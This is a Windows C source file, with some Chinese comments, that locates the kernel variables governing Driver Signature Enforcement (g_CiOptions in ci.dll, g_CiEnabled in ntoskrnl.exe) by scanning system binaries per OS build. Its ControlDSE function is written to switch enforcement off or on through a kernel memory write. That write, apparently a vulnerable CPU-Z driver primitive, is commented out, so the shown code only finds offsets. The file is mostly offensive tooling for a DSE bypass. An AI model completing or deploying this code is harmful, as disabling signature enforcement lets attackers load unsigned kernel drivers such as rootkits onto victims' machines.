#include <Windows.h>
#include <stdio.h>
#include "psapi.h"
#include "shlwapi.h"
#include "CI.h"

#pragma comment(lib, "psapi.lib")


DWORD m_osver;

VOID InitVars()
{
	HMODULE hNtdll;
	LONG ntStatus;
	ULONG    dwMajorVersion = 0;
	ULONG    dwMinorVersion = 0;
	ULONG    dwBuildNumber = 0;
	RTL_OSVERSIONINFOW VersionInformation = { 0 };

	do
	{
		fnRtlGetVersion pRtlGetVersion = NULL;
		hNtdll = GetModuleHandle(L"ntdll.dll");
		if (hNtdll == NULL)
			break;

		pRtlGetVersion = (fnRtlGetVersion)GetProcAddress(hNtdll, "RtlGetVersion");
		if (pRtlGetVersion == NULL)
			break;

		VersionInformation.dwOSVersionInfoSize = sizeof(RTL_OSVERSIONINFOW);
		ntStatus = pRtlGetVersion(&VersionInformation);

		if (ntStatus != 0)
			break;

		dwMajorVersion = VersionInformation.dwMajorVersion;
		dwMinorVersion = VersionInformation.dwMinorVersion;
		dwBuildNumber = VersionInformation.dwBuildNumber;

		if (dwMajorVersion == 5 && dwMinorVersion == 1 && dwBuildNumber == 2600)
			m_osver = WINXP2600;

		else if (dwMajorVersion == 6 && dwMinorVersion == 1 && dwBuildNumber == 7601)
		{
			m_osver = WIN77601;
		}
		else if (dwMajorVersion == 6 && dwMinorVersion == 1 && dwBuildNumber == 7600)
			m_osver = WIN77600;
		else if (dwMajorVersion == 6 && dwMinorVersion == 2 && dwBuildNumber == 9200)
			m_osver = WIN89200;
		else if (dwMajorVersion == 6 && dwMinorVersion == 3 && dwBuildNumber == 9600)
			m_osver = WIN819600;
		else if (dwMajorVersion == 10 && dwMinorVersion == 0 && dwBuildNumber == 10240)
			m_osver = WIN1010240;
		else if (dwMajorVersion == 10 && dwMinorVersion == 0 && dwBuildNumber == 10586)
			m_osver = WIN1010586;
		else if (dwMajorVersion == 10 && dwMinorVersion == 0 && dwBuildNumber == 14393)
			m_osver = WIN1014393;
		else if (dwMajorVersion == 10 && dwMinorVersion == 0 && dwBuildNumber == 15063)
			m_osver = WIN1015063;
		else if (dwMajorVersion == 10 && dwMinorVersion == 0 && dwBuildNumber == 16299)
		{
			m_osver = WIN1016299;
		}

		else if (dwMajorVersion == 10 && dwMinorVersion == 0 && dwBuildNumber == 17134)
		{
			m_osver = WIN1017134;
		}

	} while (FALSE);

}


// win8 以上的这个
ULONG_PTR QueryCiOptions()
{
	WCHAR CiDllPath[MAX_PATH];
	WCHAR System32Dir[MAX_PATH];
	GetSystemDirectory(System32Dir, MAX_PATH);

	if (PathCombine(CiDllPath, System32Dir, L"ci.dll") == NULL)
	{
		return NULL;
	}

	HMODULE hlibci = LoadLibraryExW(CiDllPath, 0, DONT_RESOLVE_DLL_REFERENCES);
	MODULEINFO modinfo;

	if (hlibci == 0)
	{
		printf("load ci failed %u\n", GetLastError());
		return NULL;
	}

	if (GetModuleInformation(GetCurrentProcess(), hlibci, &modinfo, sizeof(MODULEINFO)) == FALSE)
	{
		printf("get ci module information failed\n");
		FreeLibrary(hlibci);
		return NULL;
	}

	PVOID pCiInitialize = GetProcAddress(hlibci, "CiInitialize");

	if (pCiInitialize == NULL)
	{
		FreeLibrary(hlibci);
		printf("cannot find ci!CiInitialize\n");
		return NULL;
	}

	ULONG i;

	if (m_osver >= WIN1016299)
	{
		/* call CipInitialize */
		for (i = 0; i < 0x100; i++)
		{
			if (*(BYTE*)((ULONG_PTR)pCiInitialize + i) == 0xE8 &&
				(*(BYTE*)((ULONG_PTR)pCiInitialize + i + 5) == 0x48))
			{
				break;
			}
		}

		if (i == 0x100)
		{
			printf("Cannot find ci!CipInitialize\n");
			FreeLibrary(hlibci);
			return NULL;
		}
	}

	else
	{
		/* jmp CipInitialize */
		for (i = 0; i < 0x100; i++)
		{
			if (*(BYTE*)((ULONG_PTR)pCiInitialize + i) == 0xE9)
			{
				break;
			}
		}

		if (i == 0x100)
		{
			printf("Cannot find ci!CipInitialize\n");
			FreeLibrary(hlibci);
			return NULL;
		}

	}

	//calculate address of CipInitialize

	PVOID pCipInitialize = (PVOID)(*(LONG*)((ULONG_PTR)pCiInitialize + i + 1) + 5 + (ULONG_PTR)pCiInitialize + i);

	//is CipInitialize in ci.dll module area

	if ((ULONG_PTR)pCipInitialize <= (ULONG_PTR)hlibci ||
		(ULONG_PTR)pCipInitialize >= (ULONG_PTR)hlibci + modinfo.SizeOfImage - 0x120)
	{
		printf("ci!CipInitialize illegal\n");
		FreeLibrary(hlibci);
		return NULL;
	}

	for (i = 0; i < 0x100; i++)
	{
		if (*(WORD*)((ULONG_PTR)pCipInitialize + i) == 0x0D89)
		{
			break;
		}
	}

	if (i == 0x100)
	{
		printf("cannot find g_CiOptins in CipInitialize\n");
		FreeLibrary(hlibci);
		return NULL;
	}

	LONG rel = *(PLONG)((ULONG_PTR)pCipInitialize + i + 2);

	//calculate address of g_CiOptions ;
	//CiInitialize = CiInitialize + c + 6 + rel;

	PVOID pg_CiOptions = (PVOID)((ULONG_PTR)pCipInitialize + i + 6 + rel);


	if ((ULONG_PTR)pg_CiOptions <= (ULONG_PTR)hlibci ||
		(ULONG_PTR)pg_CiOptions >= (ULONG_PTR)hlibci + modinfo.SizeOfImage)
	{
		printf("ci!pg_CiOptions illegal\n");
		FreeLibrary(hlibci);
		return NULL;
	}

	FreeLibrary(hlibci);

	printf("[+] ci!pg_CiOptions offset = %lx\n", (ULONG)((ULONG_PTR)pg_CiOptions - (ULONG_PTR)hlibci));
	// return (ULONG_PTR)pg_CiOptions;

	return (ULONG)((ULONG_PTR)pg_CiOptions - (ULONG_PTR)hlibci);
}


UCHAR g_CiEnabled_Sig[] = { 0x48, 0x83, 0xEC, 0x28, 0x33, 0xC0, 0x38, 0x05 };
// win7以下的这个
ULONG_PTR QueryCiEnabled()
{
	WCHAR NtosPath[MAX_PATH];
	WCHAR System32Dir[MAX_PATH];
	GetSystemDirectory(System32Dir, MAX_PATH);

	ULONG g_CiEnabled_Rva = 0;

	if (PathCombine(NtosPath, System32Dir, L"ntoskrnl.exe") == NULL)
	{
		return NULL;
	}

	HMODULE hNtos = LoadLibraryExW(NtosPath, 0, DONT_RESOLVE_DLL_REFERENCES);
	MODULEINFO modinfo;

	if (hNtos == 0)
	{
		printf("[+] load ntos failed %u\n", GetLastError());
		return NULL;
	}

	if (GetModuleInformation(GetCurrentProcess(), hNtos, &modinfo, sizeof(MODULEINFO)) == FALSE)
	{
		printf("[+] get ntos module information failed\n");
		FreeLibrary(hNtos);
		return NULL;
	}

	PIMAGE_DOS_HEADER mz = (PIMAGE_DOS_HEADER)hNtos;

	PIMAGE_NT_HEADERS64 pe = (PIMAGE_NT_HEADERS64)(mz->e_lfanew + (PUCHAR)hNtos);
	PIMAGE_SECTION_HEADER s = (PIMAGE_SECTION_HEADER)(pe + 1);

	PUCHAR pPageSec = NULL;
	ULONG PageSecSize = 0;

	for (USHORT i = 0; i < pe->FileHeader.NumberOfSections; i++)
	{
		if (0 == strcmp((PCHAR)s[i].Name, "PAGE"))
		{
			pPageSec = (PUCHAR)hNtos + s[i].VirtualAddress;
			PageSecSize = s[i].SizeOfRawData;
			break;
		}
	}

	if (0 == PageSecSize ||
		NULL == pPageSec)
	{
		printf( "[+] unable to locate PAGE section in %s\n", "ntoskrnl.exe");
		return 0;
	}

	for (ULONG i = 0; i < PageSecSize - sizeof(g_CiEnabled_Sig); i++)
	{
		if (0 == memcmp(&pPageSec[i], g_CiEnabled_Sig, sizeof(g_CiEnabled_Sig)))
		{
			LONG g_cie_offset = *(PLONG)&pPageSec[i + sizeof(g_CiEnabled_Sig)];

			g_CiEnabled_Rva = (ULONG)(&pPageSec[i + sizeof(g_CiEnabled_Sig) + 4] + g_cie_offset - (PUCHAR)hNtos);
			
			break;
		}
	}
	

	return g_CiEnabled_Rva;
}


ULONG_PTR FindCiOptionsOffset()
{
	InitVars();
	if (m_osver >= WIN89200)
	{
		return QueryCiOptions();
	}
	else
	{
		return QueryCiEnabled();
	}	
}

/*
* ControlDSE
*
* Purpose:
*
* Change ntoskrnl.exe g_CiEnabled or CI.dll g_CiOptions state.
*
*/
BOOL ControlDSE(
	_In_ BOOL EnableDSE
)
{
	BOOL bResult = FALSE;
	ULONG_PTR CiAddress;

	ULONG Value;

	// Assume variable is in nonpaged .data section.
	//

	CiAddress = FindCiOptionsOffset();
	if (CiAddress == 0) {
		printf("\r\n[!] Cannot query CI variable address");
	}
	else {
		if (EnableDSE) {
			//if (g_NtBuildNumber < 9200)
			//Value = 1;   //simple bool flag
			//else
			// 不要直接使用这些值去硬编码;应该先查询出来原始的值;然后再使用;现在这些值已经不再是简单的0 1 6了;(看下16299之后的)
			Value = 6;
			//bResult = cpuz_WriteVirtualMemory((DWORD_PTR)CiAddress, &Value, sizeof(Value));
		}
		else {
			Value = 0;
			//bResult = cpuz_WriteVirtualMemory((DWORD_PTR)CiAddress, &Value, sizeof(Value));
		}
		if (bResult) {
			//supPrintText(TEXT("\r\n[+] Kernel memory patched"));
		}
		else {
			//supPrintText(TEXT("\r\n[!] Error, kernel memory not patched"));
		}
	}

	return bResult;
}